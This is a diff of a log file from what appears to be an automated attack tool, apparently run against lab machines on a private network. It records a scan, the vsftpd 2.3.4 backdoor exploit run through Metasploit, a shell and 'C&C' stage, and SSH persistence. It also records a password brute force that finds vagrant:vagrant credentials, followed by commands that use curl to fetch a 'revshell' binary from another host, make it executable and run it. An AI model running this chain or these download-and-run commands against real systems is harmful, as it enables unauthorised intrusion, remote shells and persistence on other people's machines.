@@ -1,34 +1,42 @@
-[~] LOG [2024-02-22 15:02:09.668538] : Bruteforcing user/password for 192.168.1.45
-[~] LOG [2024-02-22 15:02:09.668555] : Processing wordlist for input : ./init/userlist
-[~] LOG [2024-02-22 15:02:09.668625] : Processing wordlist for input : ./init/passlist
-[i] INF [2024-02-22 15:02:09.639952] : Launched autopwn.
-[i] INF [2024-02-22 15:02:23.367519] : Launched autopwn.
-[~] LOG [2024-02-22 15:02:23.394915] : Launching scan over @192.168.1.45 cmd :./nmap.sh 192.168.1.45 >> /dev/null
-[~] LOG [2024-02-22 15:03:26.235846] : Scan over successfully
-[~] LOG [2024-02-22 15:03:26.235869] : Retrieving exploits
-[~] LOG [2024-02-22 15:03:34.630186] : Vulnerabilities scanned
-[~] LOG [2024-02-22 15:03:34.630210] : Imported exploit_list
-[~] LOG [2024-02-22 15:03:34.631967] : Parsed ./exploit_list
-[i] INF [2024-02-22 15:03:40.686309] : Started process msfrpcd
-[~] LOG [2024-02-22 15:03:41.084393] : Retrieving EDB exploits...
-[~] LOG [2024-02-22 15:03:41.307296] : EDB exploits retrieved
-[~] LOG [2024-02-22 15:03:41.310950] : Displayed all possible exploits to user
-[~] LOG [2024-02-22 15:03:41.311400] : Displayed possible Metasploit exploits to user
-[~] LOG [2024-02-22 15:03:41.311430] : Using auto select mode for chosing exploits
-[~] LOG [2024-02-22 15:03:41.443213] : Exploit select : vsftpd 2.3.4 Backdoor Command Execution 
-[~] LOG [2024-02-22 15:03:41.443241] : Looking for best modules...
-[~] LOG [2024-02-22 15:03:41.596546] : Displayed modules
-[~] LOG [2024-02-22 15:03:41.596560] : Modules retrieved
-[~] LOG [2024-02-22 15:03:41.728158] : Displaying exploit options
-[~] LOG [2024-02-22 15:03:41.852312] : Displaying payload options
-[~] LOG [2024-02-22 15:03:41.974465] : Auto chosing payload
-[~] LOG [2024-02-22 15:03:42.114188] : Payload auto selected
-[~] LOG [2024-02-22 15:03:42.114224] : Payload and exploit options set
-[~] LOG [2024-02-22 15:03:52.103670] : Shell obtained
-[~] LOG [2024-02-22 15:03:52.202469] : Shell Created
-[i] INF [2024-02-22 15:03:52.202498] : Entered in C&C section
-[~] LOG [2024-02-22 15:03:52.203371] : Pwn Complete 
-[~] LOG [2024-02-22 15:03:52.203551] : Begin setup for SSH persistence
-[~] LOG [2024-02-22 15:03:52.321573] : Begin sending sequences
-[~] LOG [2024-02-22 15:04:18.348499] : Sequences sent
-[!] CRT [2024-02-22 15:04:18.348541] : END OF LOGS
+[0;32m[i] INF [2024-02-22 15:57:08.082805] : Launched autopwn.
+[0;0m[~] LOG [2024-02-22 15:57:08.112844] : Launching scan over @192.168.1.45 cmd :./nmap.sh 192.168.1.45 >> /dev/null
+[0;0m[~] LOG [2024-02-22 15:58:13.300023] : Scan over successfully
+[0;0m[~] LOG [2024-02-22 15:58:13.300044] : Retrieving exploits
+[0;0m[~] LOG [2024-02-22 15:58:23.285205] : Vulnerabilities scanned
+[0;0m[~] LOG [2024-02-22 15:58:23.285229] : Imported exploit_list
+[0;0m[~] LOG [2024-02-22 15:58:23.287515] : Parsed ./exploit_list
+[0;0m[0;32m[i] INF [2024-02-22 15:58:29.566022] : Started process msfrpcd
+[0;0m[~] LOG [2024-02-22 15:58:31.188617] : Retrieving EDB exploits...
+[0;0m[~] LOG [2024-02-22 15:58:31.405152] : EDB exploits retrieved
+[0;0m[~] LOG [2024-02-22 15:58:31.408907] : Displayed all possible exploits to user
+[0;0m[~] LOG [2024-02-22 15:58:31.409366] : Displayed possible Metasploit exploits to user
+[0;0m[~] LOG [2024-02-22 15:58:31.409377] : Using auto select mode for chosing exploits
+[0;0m[~] LOG [2024-02-22 15:58:31.561317] : Exploit select : vsftpd 2.3.4 Backdoor Command Execution 
+[0;0m[~] LOG [2024-02-22 15:58:31.561345] : Looking for best modules...
+[0;0m[~] LOG [2024-02-22 15:58:31.725069] : Displayed modules
+[0;0m[~] LOG [2024-02-22 15:58:31.725082] : Modules retrieved
+[0;0m[~] LOG [2024-02-22 15:58:31.846934] : Displaying exploit options
+[0;0m[~] LOG [2024-02-22 15:58:32.029626] : Displaying payload options
+[0;0m[~] LOG [2024-02-22 15:58:32.147543] : Auto chosing payload
+[0;0m[~] LOG [2024-02-22 15:58:32.280855] : Payload auto selected
+[0;0m[~] LOG [2024-02-22 15:58:32.280902] : Payload and exploit options set
+[0;0m[~] LOG [2024-02-22 15:58:42.207586] : Shell obtained
+[0;0m[~] LOG [2024-02-22 15:58:42.246527] : Shell Created
+[0;0m[0;32m[i] INF [2024-02-22 15:58:42.246550] : Entered in C&C section
+[0;0m[~] LOG [2024-02-22 15:58:42.247253] : Pwn Complete 
+[0;0m[~] LOG [2024-02-22 15:58:42.247432] : Begin setup for SSH persistence
+[0;0m[~] LOG [2024-02-22 15:58:42.739984] : Begin sending sequences
+[0;0m[~] LOG [2024-02-22 15:59:08.621850] : Sequences sent
+[0;0m[33m[!] CRT [2024-02-22 15:59:08.621865] : END OF LOGS
+[0;0m[~] LOG [2024-02-22 15:59:24.127914] : Bruteforcing user/password for 192.168.1.188
+[0;0m[~] LOG [2024-02-22 15:59:24.127930] : Processing wordlist for input : ./init/userlist
+[0;0m[~] LOG [2024-02-22 15:59:24.128016] : Processing wordlist for input : ./init/passlist
+[0;0m[~] LOG [2024-02-22 15:59:58.416145] : Pawning host 192.168.1.188 with SSH creds vagrant:vagrant
+[0;0m[~] LOG [2024-02-22 15:59:58.416223] : Connecting to 192.168.1.188 with SSH creds vagrant:vagrant
+[0;0m[~] LOG [2024-02-22 15:59:58.727222] :  Launched whoami over SSH against 192.168.1.188
+[0;0m[~] LOG [2024-02-22 15:59:58.843689] :  Launched curl -s 192.168.1.86:61671/post/vir/revshell -o revshell > /dev/null over SSH against 192.168.1.188
+[0;0m[~] LOG [2024-02-22 15:59:59.014004] :  Launched chmod +x revshell over SSH against 192.168.1.188
+[0;0m[~] LOG [2024-02-22 15:59:59.074454] :  Launched ./revshell over SSH against 192.168.1.188
+[0;0m[33m[!] CRT [2024-02-22 16:00:09.123461] : Timeout error for ./revshell. 
+[0;0m[0;32m[i] INF [2024-02-22 15:59:24.096309] : Launched autopwn.
+[0;0m
